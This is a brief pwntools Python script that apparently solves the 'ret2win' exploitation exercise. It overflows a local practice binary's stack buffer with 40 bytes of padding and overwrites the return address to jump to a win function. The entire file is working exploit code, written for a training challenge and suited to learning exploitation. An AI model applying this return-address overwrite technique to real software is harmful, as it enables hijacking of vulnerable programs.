from pwn import *

p = process('./ret2win')
p.recv()

payload  = b'A' * 40
payload += p64(0x00400812)

p.sendline(payload)
p.interactive()
